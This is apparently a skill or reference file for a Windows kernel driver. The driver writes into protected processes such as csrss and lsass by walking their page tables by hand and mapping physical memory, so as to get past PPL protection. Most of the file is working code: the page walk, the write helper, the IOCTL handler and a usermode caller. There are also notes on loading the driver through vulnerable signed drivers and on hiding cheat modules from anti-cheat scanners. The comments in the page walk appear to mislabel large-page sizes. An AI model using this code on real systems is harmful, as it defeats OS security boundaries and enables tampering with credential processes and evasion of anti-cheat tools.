---
name: kernel-cr3-physmem-write-csrss
description: Kernel driver that writes into csrss (or any process) by walking its CR3 page tables manually, translating VA → PA, and writing via MmMapIoSpaceEx. Sidesteps PsProtection and MmCopyVirtualMemory restrictions.
---

# Kernel CR3 Physical-Memory Write (csrss "cleaner")

## Why This Exists

Writing into **protected processes** (csrss, lsass with RunAsPPL, system services with
`EPROCESS.Protection != 0`) via normal kernel helpers like `MmCopyVirtualMemory` or
`KeStackAttachProcess` + direct deref fails: the OS enforces the PP/PPL boundary and either returns
`STATUS_ACCESS_DENIED` or crashes with `PROCESS_HAS_LOCKED_PAGES`.

The physical-memory route bypasses that boundary. The MMU translates virtual to physical regardless
of process protection; once you have the physical address, `MmMapIoSpaceEx` maps it into system
space where you can write freely.

## Flow

```
1. PsLookupProcessByProcessId(pid)  -> PEPROCESS
2. Read EPROCESS+0x28               -> CR3 (DirectoryTableBase)
3. For each page of the target VA:
       pa = translate_linear(CR3, va)
       map = MmMapIoSpaceEx(pa, size, PAGE_READWRITE)
       memcpy(map, src_buffer, size)
       MmUnmapIoSpace(map, size)
4. ObDereferenceObject(process)
```

Target VA may straddle page boundaries; chunk the write so each `MmMapIoSpaceEx` call maps a single
page.

## Manual x64 Paging Walk

```cpp
#define PAGE_OFFSET_SIZE 12
static const UINT64 PMASK = (~0xfull << 8) & 0xfffffffffull;

UINT64 translate_linear(UINT64 cr3, UINT64 va) {
    if (cr3 & 0xf) return 0;  // sanity: CR3 lower nibble clear

    UINT64 off  = va & ((1ULL << PAGE_OFFSET_SIZE) - 1);
    UINT64 pte  = (va >> 12) & 0x1FF;
    UINT64 pt   = (va >> 21) & 0x1FF;
    UINT64 pd   = (va >> 30) & 0x1FF;
    UINT64 pdp  = (va >> 39) & 0x1FF;
    SIZE_T n = 0;

    UINT64 pdpe = 0;
    if (!NT_SUCCESS(Read::read((PVOID)(cr3 + 8 * pdp), &pdpe, 8, &n))
        || n != 8 || !(pdpe & 1)) return 0;

    UINT64 pde = 0;
    if (!NT_SUCCESS(Read::read((PVOID)((pdpe & PMASK) + 8 * pd), &pde, 8, &n))
        || n != 8 || !(pde & 1)) return 0;

    if (pde & 0x80)        // 2 MB large page
        return (pde & (~0ULL << 42 >> 12)) + (va & ~(~0ULL << 30));

    UINT64 pt_e = 0;
    if (!NT_SUCCESS(Read::read((PVOID)((pde & PMASK) + 8 * pt), &pt_e, 8, &n))
        || n != 8 || !(pt_e & 1)) return 0;

    if (pt_e & 0x80)       // 1 GB page
        return (pt_e & PMASK) + (va & ~(~0ULL << 21));

    UINT64 phys = 0;
    if (!NT_SUCCESS(Read::read((PVOID)((pt_e & PMASK) + 8 * pte), &phys, 8, &n))
        || n != 8) return 0;

    phys &= PMASK;
    return phys ? phys + off : 0;
}
```

Each `Read::read` goes through the same `MmMapIoSpaceEx` physical primitive, since reading page
tables of another process also needs physical access on protected systems.

## Write Helper

```cpp
NTSTATUS Write::write(PVOID pa, PVOID src, SIZE_T size, SIZE_T* written) {
    if (!pa) return STATUS_UNSUCCESSFUL;
    PHYSICAL_ADDRESS p{}; p.QuadPart = (LONGLONG)pa;
    PVOID map = MmMapIoSpaceEx(p, size, PAGE_READWRITE);
    if (!map) return STATUS_UNSUCCESSFUL;
    Helper::custom_Memcpy(map, src, size);
    *written = size;
    MmUnmapIoSpace(map, size);
    return STATUS_SUCCESS;
}
```

`MmMapIoSpaceEx` is available from Win10 1607+; older systems use `MmMapIoSpace` with
`MmNonCached`.

## IOCTL Interface

Driver side:

```cpp
#define IOCTL_WRITE_MEMORY \
    CTL_CODE(FILE_DEVICE_UNKNOWN, 0x810, METHOD_BUFFERED, FILE_ANY_ACCESS)

typedef struct _write {
    INT32     process_id;
    ULONGLONG address;
    ULONGLONG buffer;
    ULONGLONG size;
} rw, *WriteStruct;

NTSTATUS DeviceIoControl(PDEVICE_OBJECT, PIRP Irp) {
    PIO_STACK_LOCATION s = IoGetCurrentIrpStackLocation(Irp);
    NTSTATUS st = STATUS_INVALID_DEVICE_REQUEST;
    if (s->Parameters.DeviceIoControl.IoControlCode == IOCTL_WRITE_MEMORY
        && s->Parameters.DeviceIoControl.InputBufferLength >= sizeof(rw)) {
        st = Write::WriteMemory((WriteStruct)Irp->AssociatedIrp.SystemBuffer);
    }
    Irp->IoStatus.Status = st;
    Irp->IoStatus.Information = 0;
    IoCompleteRequest(Irp, IO_NO_INCREMENT);
    return st;
}
```

Usermode caller:

```cpp
HANDLE h = CreateFileA("\\\\.\\{abadabadu}", GENERIC_READ | GENERIC_WRITE,
                      0, nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
rw req{ csrss_pid, va, (ULONGLONG)buf, size };
DWORD br = 0;
DeviceIoControl(h, IOCTL_WRITE_MEMORY, &req, sizeof(req),
                &req, sizeof(req), &br, nullptr);
```

## WriteMemory Full

```cpp
NTSTATUS Write::WriteMemory(WriteStruct x) {
    if (!x || !x->process_id) return STATUS_INVALID_PARAMETER;

    PEPROCESS proc = nullptr;
    if (!NT_SUCCESS(PsLookupProcessByProcessId((HANDLE)x->process_id, &proc)) || !proc)
        return STATUS_UNSUCCESSFUL;

    ULONGLONG cr3 = *(ULONGLONG*)((PUCHAR)proc + 0x28);  // EPROCESS.DirectoryTableBase
    ObDereferenceObject(proc);
    if (!cr3) return STATUS_UNSUCCESSFUL;

    INT64 pa = Helper::translate_linear(cr3, x->address);
    if (!pa) return STATUS_UNSUCCESSFUL;

    ULONG64 chunk = Helper::find_min(PAGE_SIZE - (pa & 0xFFF), x->size);
    SIZE_T  wrote = 0;
    return write((PVOID)pa, (PVOID)x->buffer, chunk, &wrote);
}
```

For writes spanning multiple pages, loop: translate each page's VA, write up to the page boundary,
advance `this_offset`, repeat.

## Offsets That Change Per Build

- `EPROCESS.DirectoryTableBase` offset -- 0x28 on tested Win10/11 builds, but shifts across SPs.
  Use pattern-scan on `PsInitialSystemProcess` or `KiSystemCall64` prologue to resolve dynamically.
- `PMASK` -- works for 48-bit physical address spaces. Extend to 52-bit for Ice Lake / Zen 3+.

## Operational Notes

- Driver must be DSE-signed or loaded via BYOVD (see `gh-vulnerable-drivers`).
- `MmMapIoSpaceEx` with `PAGE_READWRITE` is logged by PatchGuard on some builds. Prefer
  `MmNonCached` and release immediately.
- Protected process status (`EPROCESS.Protection`) is not consulted at the physical mapping layer,
  which is why this works against lsass PPL. Writing arbitrary addresses in a PPL still crashes
  the system if you break code integrity -- restrict writes to data regions.
- csrss specifically is useful because many screenshare / anti-cheat tools query csrss's internal
  module tables for cheat detection; patching those tables in-place hides the cheat module.

## Detection

- Minifilters observing `MmMapIoSpaceEx` + `MmBuildMdlForNonPagedPool` from unsigned drivers.
- PatchGuard integrity checks on `PsLookupProcessByProcessId` call sites in non-whitelisted drivers.
- Memory-integrity (HVCI) enforces that physical pages mapped `PAGE_READWRITE` by a driver cannot
  overlap executable code pages of PPL processes. On HVCI-enforced systems the write silently
  fails or crashes with `KERNEL_SECURITY_CHECK_FAILURE`.
- Boot-time EDR drivers hook `IoCreateDriver` and inspect `DriverEntry` for CR3 translation
  signatures (`PMASK` constant, `0x1FF`-masked right shifts by 12/21/30/39).

## Related

- `windows-eop-hyperv-exploit` -- HVCI mitigates this specific primitive.
- `vgk-kernel-memory-rw` -- Valorant's own kernel driver uses a related MDL-based write path.
- `gh-vulnerable-drivers` -- how an unsigned CR3 driver gets to run in the first place.
